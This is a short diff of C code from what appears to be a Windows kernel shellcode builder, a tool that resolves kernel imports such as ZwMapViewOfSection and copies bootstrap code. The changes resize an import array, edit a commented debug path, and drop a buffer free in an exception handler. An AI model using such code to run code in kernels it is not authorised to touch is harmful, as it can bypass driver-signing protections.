 typedef NTSTATUS(NTAPI* pfnScDispatchRoutine)(
     _In_ struct _DEVICE_OBJECT* DeviceObject,
     _Inout_ struct _IRP* Irp,
@@ -1549,8 +1553,8 @@ BOOL ScBuildShellImport(
 
     PVOID MmSectionObjectTypePtr;
 
-    PVOID funcPtrs[MAX_BASE_SCIMPORTS_NODBGPRINT];
-    LPCSTR funcNames[MAX_BASE_SCIMPORTS_NODBGPRINT] = {
+    PVOID funcPtrs[MAX_BASE_SCIMPORTS];
+    LPCSTR funcNames[MAX_BASE_SCIMPORTS] = {
         "ExAllocatePoolWithTag",
         "IofCompleteRequest",
         "ZwMapViewOfSection",
@@ -1921,14 +1925,12 @@ PVOID ScAllocate(
 
     __try {
         RtlCopyMemory(pvBootstrap, procPtr, procSize);
-        //supWriteBufferToFile((PWSTR)L"C:\\install\\out2.bin", pvBootstrap, procSize, FALSE, FALSE, NULL);
+        //supWriteBufferToFile((PWSTR)L"out.bin", pvBootstrap, procSize, FALSE, FALSE, NULL);
         ////((void(*)())ShellCode.Version.v1->InitCode)();
 
     }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         
-        ScFree(pvShellCode, scSize);
-
         supPrintfEvent(kduEventError, 
             "[!] Exception during building shellcode, 0x%lX\r\n", 
             GetExceptionCode());
